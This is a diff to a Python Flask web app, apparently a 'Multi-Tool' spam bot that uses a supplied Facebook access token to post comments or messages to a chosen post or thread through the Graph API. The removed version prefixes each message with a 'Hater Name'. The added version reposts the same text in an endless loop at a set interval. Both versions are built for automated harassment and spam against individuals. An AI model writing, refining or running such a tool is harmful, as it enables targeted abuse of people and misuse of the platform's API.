@@ -4,93 +4,86 @@ import time
 
 app = Flask(__name__)
 
-CREATOR = "Created by Raghu ACC Rullx Boy"
-
-HTML_FORM = '''
+# HTML Template
+HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Multi-Tool by Raghu</title>
+    <title>Multi-Tool by Raghu ACC Rullx Boy</title>
     <style>
-        body { background-color: #f0f0f0; font-family: Arial, sans-serif; padding: 20px; }
-        .container { background: #fff; padding: 20px; border-radius: 8px; max-width: 400px; margin: auto; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        h1, h3 { color: #d9534f; text-align: center; }
-        label { display: block; margin-top: 10px; }
-        input, textarea, select { width: 100%; padding: 8px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; }
-        button { background: #d9534f; color: white; padding: 10px; border: none; border-radius: 4px; cursor: pointer; margin-top: 15px; width: 100%; }
-        button:hover { background: #c9302c; }
+        body { background-color: #f2f2f2; font-family: Arial, sans-serif; }
+        .container { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 10px; }
+        h1 { text-align: center; color: #333; }
+        label { font-weight: bold; }
+        .btn { background-color: #4CAF50; color: white; padding: 10px; border: none; cursor: pointer; width: 100%; }
+        .btn:hover { background-color: #45a049; }
+        footer { text-align: center; margin-top: 20px; color: #888; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Multi-Tool by Raghu</h1>
-        <h3>{creator}</h3>
-        <form method="POST" enctype="multipart/form-data">
-            <label for="tool">Select Tool:</label>
-            <select id="tool" name="tool" required>
-                <option value="comment">Auto Comment</option>
-                <option value="message">Auto Message</option>
-                <option value="convo">Convo Sender</option>
-            </select>
-
-            <label for="accessToken">Access Token:</label>
-            <input type="text" id="accessToken" name="accessToken" required>
-
-            <label for="postId">Post ID / Thread ID:</label>
-            <input type="text" id="postId" name="postId" required>
-
-            <label for="haterName">Hater Name:</label>
-            <input type="text" id="haterName" name="haterName" required>
-
-            <label for="messageFile">Message/Comment/Convo File (.txt):</label>
-            <input type="file" id="messageFile" name="messageFile" accept=".txt" required>
-
-            <label for="interval">Time Interval (in seconds):</label>
-            <input type="number" id="interval" name="interval" value="5" required>
-
-            <button type="submit">Start Sending</button>
+        <h1>Multi-Tool by Raghu ACC Rullx Boy</h1>
+        <form method="POST">
+            <label>Access Token:</label>
+            <input type="text" name="access_token" required><br><br>
+            
+            <label>Post ID (for Comments) / Thread ID (for Messages):</label>
+            <input type="text" name="id" required><br><br>
+            
+            <label>Message or Comment Text:</label>
+            <textarea name="message" rows="4" required></textarea><br><br>
+            
+            <label>Choose Action:</label><br>
+            <input type="radio" name="action" value="comment" required> Auto Comment<br>
+            <input type="radio" name="action" value="message" required> Auto Message<br><br>
+            
+            <label>Time Interval (seconds):</label>
+            <input type="number" name="interval" value="5" required><br><br>
+            
+            <button type="submit" class="btn">Start</button>
         </form>
     </div>
+    <footer>
+        <p>Created by Raghu ACC Rullx Boy ❤️</p>
+    </footer>
 </body>
 </html>
-'''.format(creator=CREATOR)
+'''
 
 @app.route('/', methods=['GET', 'POST'])
-def index():
+def home():
     if request.method == 'POST':
-        tool = request.form.get('tool')
-        access_token = request.form.get('accessToken')
-        post_id = request.form.get('postId')
-        hater_name = request.form.get('haterName')
-        interval = int(request.form.get('interval'))
-        file = request.files['messageFile']
+        access_token = request.form['access_token']
+        target_id = request.form['id']
+        message = request.form['message']
+        action = request.form['action']
+        interval = int(request.form['interval'])
 
-        messages = file.read().decode().splitlines()
-
-        if tool == 'comment':
-            api_url = f"https://graph.facebook.com/{post_id}/comments"
-        elif tool == 'message':
-            api_url = f"https://graph.facebook.com/{post_id}/messages"
-        elif tool == 'convo':
-            api_url = f"https://graph.facebook.com/{post_id}/conversations"
+        if action == 'comment':
+            api_url = f"https://graph.facebook.com/v15.0/{target_id}/comments"
         else:
-            return "Invalid tool selected!"
+            api_url = f"https://graph.facebook.com/v15.0/t_{target_id}/messages"
 
-        for message in messages:
-            full_message = f"{hater_name} {message}"
-            params = {'access_token': access_token, 'message': full_message}
-            response = requests.post(api_url, data=params)
+        headers = {
+            'Authorization': f'Bearer {access_token}'
+        }
 
-            if response.status_code == 200:
-                print(f"Success: {full_message}")
-            else:
-                print(f"Failed: {response.text}")
-
-            time.sleep(interval)
-
-    return render_template_string(HTML_FORM)
+        while True:
+            try:
+                payload = {'message': message}
+                response = requests.post(api_url, headers=headers, data=payload)
+                if response.status_code == 200:
+                    print(f"✅ {action.capitalize()} sent successfully: {message}")
+                else:
+                    print(f"❌ Failed to send {action}: {response.text}")
+                time.sleep(interval)
+            except Exception as e:
+                print(f"⚠️ Error: {e}")
+                time.sleep(30)
+    
+    return render_template_string(HTML_TEMPLATE)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
